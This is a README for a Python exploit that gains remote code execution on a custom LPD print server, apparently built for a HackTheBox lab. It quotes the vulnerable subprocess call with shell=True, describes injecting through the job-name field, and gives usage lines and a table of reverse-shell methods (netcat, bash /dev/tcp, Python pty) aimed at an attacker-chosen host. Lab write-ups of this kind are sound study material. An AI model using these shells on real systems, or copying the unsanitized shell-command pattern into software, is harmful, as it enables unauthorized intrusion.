# LPD Shell Injection: RCE Exploit (RFC 1179)

A precision Python exploit for a shell injection vulnerability
in a custom LPD (Line Printer Daemon) server.

Tested on: **HackTheBox: Paperwork**

---

## What is it?

The vulnerable server passes the print job name unsanitized into a shell command:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

This allows a **single-quote breakout** to achieve Remote Code Execution (RCE):

---

## Usage

```bash
# Try all reverse shell payloads automatically
python3 poc.py TARGET --lhost YOUR_IP --lport 443

# Single specific payload
python3 poc.py TARGET --lhost YOUR_IP --lport 443 --payload mkfifo

# Test RCE without a listener (writes /tmp/rce_proof.txt on target)
python3 poc.py TARGET --proof
```

---

## Available Payloads

| Flag | Method |
|------|--------|
| `mkfifo` | mkfifo + netcat (most reliable) |
| `nc_e` | netcat with -e flag |
| `nc_c` | netcat with -c flag |
| `python3` | Python3 socket + pty shell |
| `python` | Python2 socket + pty shell |
| `bash` | bash /dev/tcp redirect |

---

## Protocol Details (RFC 1179 / LPD)

- Connects to target on port **1515** (default)
- Sends a print job to queue `archive_intake`
- Injects payload into the `J` (job name) field of the LPD control file
- Server executes injected command via `subprocess.Popen(..., shell=True)`

---

## Requirements

```bash
pip install nothing   # pure Python, no dependencies
python3 poc.py --help
```

---

## Disclaimer

For **authorized testing only**. Built for HackTheBox lab environments.
